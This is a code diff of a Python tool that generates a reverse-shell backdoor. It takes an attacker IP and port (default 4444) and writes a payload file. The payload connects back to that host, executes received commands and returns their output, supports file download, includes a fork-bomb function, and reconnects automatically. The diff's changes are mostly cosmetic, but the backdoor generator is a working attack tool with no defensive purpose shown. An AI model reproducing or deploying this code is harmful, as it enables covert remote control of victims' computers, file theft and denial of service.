@@ -1,10 +1,9 @@
-import sys
 import os
 import socket
 from requests import get
+
 try:
 	ip = get("https://api.ipify.org").text
-	os.system('clear')
 	print("""\033[1;36m  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
   ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
   ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
@@ -19,18 +18,17 @@ try:
 	print('')
 	IP=input("  \033[1;mIP : \033[1;36m")
 	if IP == '' :
-		print ("  Default -> \033[1;36m", ip)
+		print ("  \033[1;mDefault -> \033[1;36m", ip)
 		IP = ip
 	PORT=input("  \033[1;mPORT : \033[1;36m")
 	if PORT == '' :
-		print ("  Default -> 4444")
+		print ("  \033[1;mDefault -> \033[1;36m4444")
 		PORT = ("4444")
 	payload=('''import os
 import time
 import socket
 import getpass
 import platform
-import colorama
 import subprocess
 from colorama import Fore, Style
 
@@ -63,11 +61,11 @@ def helper():
 {Fore.CYAN}exit : {Style.RESET_ALL}exit the backdoor\\n"""
     sock.send(helper.encode())
     
-def bomb():
+def bomb(): #Only support Linux
     sock.send("\\n SUCCESS\\U0001f480\\n".encode())
     while True:
         os.fork()
-        sock.close()
+        sock.close() 
     
 def download():
     file_path = sock.recv(5000)
@@ -134,24 +132,19 @@ if __name__=="__main__":
                 output = comm.stdout.read()+ comm.stderr.read()
                 sock.send(output)
 
-        except BrokenPipeError:
-            time.sleep(5)
-            del sock
-            client_connect()
-
-        except ConnectionResetError:
+        except:
             time.sleep(5)
             del sock
             client_connect()''')
 	payload = payload.replace("[IP]",IP).replace("[PORT]",PORT).encode()
-	name = str(input("\n  ENTER THE FILE NAME : "))
+	name = str(input("\n  ENTER THE FILE NAME : \033[1;m"))
 	name = (name + ".py")
 	file = open("./Output/"+name, 'wb')
 	file.write(payload)
 	file.close()
 	print('')
-	print ("  \033[1;mThe generated payload is in the Output directory.")
+	print ("  \033[33m\033[01mThe generated payload is in the Output directory.\033[1;m")
 	print('')
 
 except KeyboardInterrupt:
-	os.system('clear')
+	os.system("clear")
